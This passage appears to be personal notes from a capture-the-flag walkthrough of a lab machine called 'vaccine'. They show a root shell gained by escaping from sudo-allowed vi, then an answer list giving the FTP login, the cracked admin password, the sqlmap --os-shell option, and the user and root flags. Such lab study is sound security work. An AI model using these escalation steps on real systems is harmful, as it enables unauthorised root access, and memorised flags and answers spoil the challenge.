    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

https://gtfobins.github.io/gtfobins/vi/

postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh' /dev/null
Sorry, user postgres is not allowed to execute '/bin/vi /etc/postgresql/11/main/pg_hba.conf -c :!/bin/sh /dev/null' as root on vaccine.

second method

vi
:set shell=/bin/sh
:shell

postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
# whaomi
/bin/sh: 1: whaomi: not found
# whoami
root
# bash
root@vaccine:/var/lib/postgresql# find / -type f -name root.txt 2>/dev/null
/root/root.txt
root@vaccine:/var/lib/postgresql# cat /root/root.txt
dd6e058e814260bc70e9bbdef2715849

pwnd

```

![[Pasted image 20221108080711.png]]

![[Pasted image 20221108081036.png]]
![[Pasted image 20221108084539.png]]
![[Pasted image 20221108084605.png]]

Besides SSH and HTTP, what other service is hosted on this box? 
*ftp*
This service can be configured to allow login with any password for specific username. What is that username? 
*anonymous*
What is the name of the file downloaded over this service? 
*backup.zip*
What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? 
*zip2john*
What is the password for the admin user on the website? 
*qwerty789*
What option can be passed to sqlmap to try to get command execution via the sql injection? 
*--os-shell*
What program can the postgres user run as root using sudo? 
*vi*
Submit user flag 
*ec9b13ca4d6229cd5cc1e09980965bf7*
Submit root flag 
*dd6e058e814260bc70e9bbdef2715849*




[[Oopsie]]